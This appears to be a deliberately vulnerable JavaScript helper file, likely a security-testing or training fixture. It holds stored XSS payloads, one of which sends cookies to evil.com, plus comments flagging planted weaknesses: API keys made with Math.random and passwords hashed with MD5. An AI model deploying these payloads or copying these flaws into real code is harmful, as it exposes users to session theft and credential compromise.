// Helper functions used by server.js

function getUserBio(userId) {
    // This returns user data that could contain XSS payloads
    const bios = {
        '1': 'Normal user bio',
        '2': '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
        '3': '<img src=x onerror="alert(1)">'
    };
    return bios[userId] || 'Unknown user';
}

function generateApiKey() {
    // VULN: Using weak randomness for security token
    return Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
}

function hashPassword(password) {
    const crypto = require('crypto');
    // VULN: Using MD5 for password hashing
    return crypto.createHash('md5').update(password).digest('hex');
}

module.exports = { getUserBio, generateApiKey, hashPassword };
